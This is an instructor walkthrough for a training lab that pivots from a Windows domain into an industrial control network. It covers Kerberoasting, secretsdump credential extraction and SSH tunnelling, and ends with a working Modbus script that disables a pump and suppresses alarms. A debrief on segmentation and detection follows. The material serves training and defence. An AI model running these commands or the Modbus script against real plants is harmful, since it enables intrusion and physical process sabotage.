# Walkthrough — SCEN-004: ICS/OT Pivot — IT to OT Kill Chain

**INSTRUCTOR ONLY — Do not distribute to students**

---

## Phase 1: IT Foothold

### Step 1: Access dc01
```bash
# Option A: PsExec via Impacket
impacket-psexec lab.local/jsmith:'Password123'@<dc01_ip>

# Option B: WinRM
evil-winrm -i <dc01_ip> -u jsmith -p 'Password123'

# Option C: CrackMapExec validation first
crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local
```

### Step 2: Situational Awareness
```bash
# Domain enumeration
whoami /all
net user /domain
net group "Domain Admins" /domain
net group "Domain Users" /domain

# Look for engineering / SCADA related accounts
net user eng_admin /domain
net user svc_scada /domain

# Find computers in the domain
net group "Domain Computers" /domain

# Check local network
ipconfig /all
arp -a
```

Expected findings:
- `eng_admin` — member of an "Engineering" group, has local admin on eng-ws
- `svc_scada` — service account with SPN set (Kerberoastable)
- Domain computers include `eng-ws`, which is the pivot target

---

## Phase 2: Credential Escalation

### Step 3: Kerberoasting
```bash
# From kali — request TGS tickets for SPN accounts
impacket-GetUserSPNs lab.local/jsmith:'Password123' -dc-ip <dc01_ip> -request

# Expected output:
# ServicePrincipalName    Name        MemberOf  PasswordLastSet
# SCADA/scada.lab.local   svc_scada            2026-03-31
#
# $krb5tgs$23$*svc_scada$LAB.LOCAL$...

# Save the hash
impacket-GetUserSPNs lab.local/jsmith:'Password123' -dc-ip <dc01_ip> \
  -request -outputfile svc_scada.hash
```

### Step 4: Crack the Service Account Password
```bash
# Crack with hashcat
hashcat -m 13100 svc_scada.hash /usr/share/wordlists/rockyou.txt

# Expected result: Scada$vc2024
# This confirms the svc_scada password but doesn't directly give us eng_admin
```

### Step 5: Find eng_admin Credentials
```bash
# Option A: Check if svc_scada has useful access
crackmapexec smb <dc01_ip> -u svc_scada -p 'Scada$vc2024' -d lab.local --shares
# Look for engineering shares with scripts/configs containing eng_admin creds

# Option B: WDigest dump if enabled
impacket-secretsdump lab.local/jsmith:'Password123'@<dc01_ip>
# Look for eng_admin cleartext in LSASS (WDigest enabled)

# Option C: Enumerate shares for credential files
crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local \
  --shares --spider-shares

# Expected: eng_admin credentials discovered via one of these paths
# eng_admin / Eng1neer2024!
```

### Step 6: Validate eng_admin Access
```bash
# Confirm eng_admin has access to eng-ws
crackmapexec ssh <eng_ws_blue_ip> -u eng_admin -p 'Eng1neer2024!'
# Expected: [+] eng_admin:Eng1neer2024! (Pwn3d!)
```

---

## Phase 3: OT Zone Pivot

### Step 7: Access Engineering Workstation
```bash
# SSH to eng-ws from kali (kali has Blue zone access via dual-home)
ssh eng_admin@<eng_ws_blue_ip>
# Password: Eng1neer2024!
```

### Step 8: Discover OT Network
```bash
# On eng-ws — enumerate network interfaces
ip addr show
# Expected: two interfaces
#   eth0: 10.10.(2N).50/24  — Blue zone
#   eth1: 192.168.(100+N).x — OT zone

# Check routing table
ip route show
# Expected: routes to both 10.10.(2N).0/24 and 192.168.(100+N).0/24

# Quick OT zone scan from eng-ws
nmap -sn 192.168.(100+N).0/24
# Expected: openplc-01 (.10), historian (.20), grfics-host (.30)

# Service scan
nmap -p 502,8080,8086,3000 192.168.(100+N).10-30
```

### Step 9: Set Up Pivot
```bash
# Option A: SSH dynamic port forwarding (SOCKS proxy)
# From kali:
ssh -D 1080 eng_admin@<eng_ws_blue_ip>

# Then use proxychains for all OT traffic:
# Edit /etc/proxychains4.conf → socks5 127.0.0.1 1080

# Option B: SSH local port forwarding (specific ports)
# Forward Modbus TCP to openplc-01
ssh -L 5502:192.168.(100+N).10:502 eng_admin@<eng_ws_blue_ip>

# Forward Grafana
ssh -L 3000:192.168.(100+N).20:3000 eng_admin@<eng_ws_blue_ip>

# Forward GRFICSv2 HMI
ssh -L 8080:192.168.(100+N).30:8080 eng_admin@<eng_ws_blue_ip>

# Option C: Multiple forwards in one command
ssh -L 5502:192.168.(100+N).10:502 \
    -L 3000:192.168.(100+N).20:3000 \
    -L 8080:192.168.(100+N).30:8080 \
    eng_admin@<eng_ws_blue_ip>
```

---

## Phase 4: ICS Exploitation

### Step 10: OT Reconnaissance
```bash
# Via SOCKS proxy:
proxychains nmap -sT -p 502,8080,8086,3000,4840 192.168.(100+N).10-30

# Or via local port forward — test Modbus connectivity:
python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('127.0.0.1', port=5502)
print('Connected:', client.connect())
client.close()
"
```

### Step 11: Read Modbus Registers
```python
#!/usr/bin/env python3
# modbus_recon.py — run from kali with port forward active
from pymodbus.client import ModbusTcpClient

# Connect through SSH tunnel (localhost:5502 → openplc:502)
client = ModbusTcpClient('127.0.0.1', port=5502)
client.connect()

# Read coils (pump status)
coils = client.read_coils(0, 3, slave=1)
print(f"Coil 0 (Pump Enable):  {coils.bits[0]}")
print(f"Coil 1 (Alarm High):   {coils.bits[1]}")
print(f"Coil 2 (Alarm Low):    {coils.bits[2]}")

# Read input registers (tank level)
ir = client.read_input_registers(0, 1, slave=1)
print(f"\nTank Level (IR 0):     {ir.registers[0]}")

# Read holding registers (pump speed, setpoints)
hr = client.read_holding_registers(0, 1, slave=1)
print(f"Pump Speed (HR 0):     {hr.registers[0]}")

# Read setpoint registers (HR 1024-1026 via OpenPLC %MW mapping)
sp = client.read_holding_registers(1024, 3, slave=1)
print(f"\nSetpoint (HR 1024):    {sp.registers[0]}")
print(f"Alarm High (HR 1025):  {sp.registers[1]}")
print(f"Alarm Low (HR 1026):   {sp.registers[2]}")

client.close()
```

Expected output:
```
Coil 0 (Pump Enable):  True
Coil 1 (Alarm High):   False
Coil 2 (Alarm Low):    False

Tank Level (IR 0):     ~500 (varies)
Pump Speed (HR 0):     ~750

Setpoint (HR 1024):    750
Alarm High (HR 1025):  900
Alarm Low (HR 1026):   200
```

### Step 12: Manipulate the Process
```python
#!/usr/bin/env python3
# modbus_attack.py — process manipulation via Modbus writes
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient('127.0.0.1', port=5502)
client.connect()

# Attack 1: Lower setpoint to cause underfill
print("[*] Lowering setpoint from 750 to 200...")
client.write_register(1024, 200, slave=1)

time.sleep(5)

# Verify the change
sp = client.read_holding_registers(1024, 1, slave=1)
print(f"[+] Setpoint is now: {sp.registers[0]}")

# Attack 2: Disable the pump entirely
print("[*] Disabling pump (coil 0 → False)...")
client.write_coil(0, False, slave=1)

# Attack 3: Suppress alarms by raising thresholds
print("[*] Raising alarm high threshold to 9999...")
client.write_register(1025, 9999, slave=1)
print("[*] Lowering alarm low threshold to 0...")
client.write_register(1026, 0, slave=1)

print("[+] Attack complete. Check Grafana dashboard to observe impact.")

client.close()
```

### Step 13: Observe Impact (Bonus)
```bash
# Access Grafana via port forward
# Browser: http://localhost:3000
# Login: admin / LabGrafana2024!
# Navigate to: SCADA Process Monitor dashboard
# Observe: tank level dropping, pump speed at 0, setpoint changed

# Access GRFICSv2 HMI via port forward
# Browser: http://localhost:8080
# Observe: chemical plant process state changes
```

---

## Credential Chain Summary

```
jsmith (Password123)              ← provided (phishing foothold)
    │
    ├── dc01 access               ← domain user, can authenticate
    │   │
    │   └── Kerberoasting         ← enumerate SPNs (T1558.003)
    │       │
    │       └── svc_scada hash    ← crack offline → Scada$vc2024
    │
    └── credential escalation     ← WDigest dump or share enum
        │
        └── eng_admin (Eng1neer2024!)  ← engineering team lead
            │
            ├── eng-ws SSH access      ← lateral movement (T1021.004)
            │   │
            │   └── dual-homed         ← discover OT interface
            │       │
            │       └── SSH tunnel     ← pivot into OT zone
            │           │
            │           ├── openplc-01 ← Modbus TCP (T0855/T0836)
            │           ├── historian  ← Grafana observation
            │           └── grfics     ← HMI access
            │
            └── process manipulation   ← setpoint change, pump disable
```

---

## Register Map (Quick Reference)

| Register | Address | Type | Default | Description |
|---|---|---|---|---|
| Pump Enable | Coil 0 | R/W | ON | Main pump control |
| Alarm High | Coil 1 | R | OFF | High level alarm output |
| Alarm Low | Coil 2 | R | OFF | Low level alarm output |
| Tank Level | IR 0 | R | ~500 | Current tank level |
| Pump Speed | HR 0 | R/W | ~750 | Pump speed setpoint |
| Setpoint | HR 1024 | R/W | 750 | Target tank level |
| Alarm High Threshold | HR 1025 | R/W | 900 | High alarm trigger |
| Alarm Low Threshold | HR 1026 | R/W | 200 | Low alarm trigger |

---

## Debrief Discussion Points

1. **IT/OT Convergence Risk**: The dual-homed engineering workstation is the single biggest vulnerability in this scenario. In real-world ICS environments, engineering workstations are the most common pivot point from IT to OT — they need access to both zones by design, creating an inherent risk.

2. **The Purdue Model**: This attack violated every level boundary in the Purdue Enterprise Reference Architecture. Discuss how proper segmentation with firewalls, jump servers, and data diodes could have prevented each pivot step.

3. **OT Authentication Gap**: Modbus TCP has no authentication. Once an attacker reaches the OT network, there is nothing preventing them from writing to any register. This is not a bug — it is a 1979 protocol design that was never intended for TCP/IP networks. Compare with OPC-UA (which has authentication) and IEC 62443 requirements.

4. **Detection Opportunities**:
   - Event ID 4769 (Kerberos TGS request) with encryption type 0x17 (RC4) indicates Kerberoasting
   - Unexpected SSH sessions from IT hosts to eng-ws
   - New TCP connections from eng-ws to OT zone hosts (Modbus TCP 502)
   - Modbus FC06 (Write Single Register) from non-HMI/non-SCADA source IPs
   - Historian data showing process values outside normal operating ranges

5. **Real-World Parallels**:
   - **TRITON/TRISIS (2017)**: Attackers pivoted from IT to OT to target Schneider Triconex safety controllers at a Saudi petrochemical plant
   - **CRASHOVERRIDE (2016)**: IT compromise → OT pivot → IEC 61850/104 commands to open breakers at Ukrainian power grid
   - **Volt Typhoon (2023-present)**: Chinese APT pre-positioning in US critical infrastructure IT networks, with assessed capability to pivot to OT
   - **Oldsmar Water (2021)**: Direct OT access (no IT pivot needed — TeamViewer on HMI) to manipulate NaOH dosing levels
